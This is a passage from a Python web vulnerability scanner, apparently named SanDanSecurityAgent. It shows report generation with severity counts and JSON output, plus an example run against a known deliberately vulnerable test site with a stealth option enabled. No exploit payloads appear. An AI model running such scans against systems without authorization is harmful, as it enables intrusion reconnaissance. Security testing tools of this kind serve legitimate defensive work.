                "high_count": len(vulnerabilities_cleaned["high"]),
                "medium_count": len(vulnerabilities_cleaned["medium"]),
                "low_count": len(vulnerabilities_cleaned["low"]),
                "info_count": len(vulnerabilities_cleaned["info"]),
            },
            "vulnerabilities_details": vulnerabilities_cleaned,
            "scan_log": [entry[0] for entry in self.log] # Only log messages for report
        }

        try:
            with open(report_filename, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, indent=4, ensure_ascii=False)
            self.log_finding(f"Scan report generated: {report_filename}", "info")
        except Exception as e:
            self.log_finding(f"Error generating report: {str(e)}", "critical")

# Example Usage:
if __name__ == "__main__":
    # To run, either specify target_url directly or leave it None to be prompted
    # Use target_url="http://testphp.vulnweb.com" for a known vulnerable target
    # or "http://localhost:8000" if you have a local test server running.
    scanner = SanDanSecurityAgent(target_url="http://testphp.vulnweb.com", debug=False, stealth_mode=True, max_threads=10)
    # scanner = SanDanSecurityAgent(debug=True, stealth_mode=False) # Uncomment to be prompted for URL, enable debug
    scanner.run_scan()
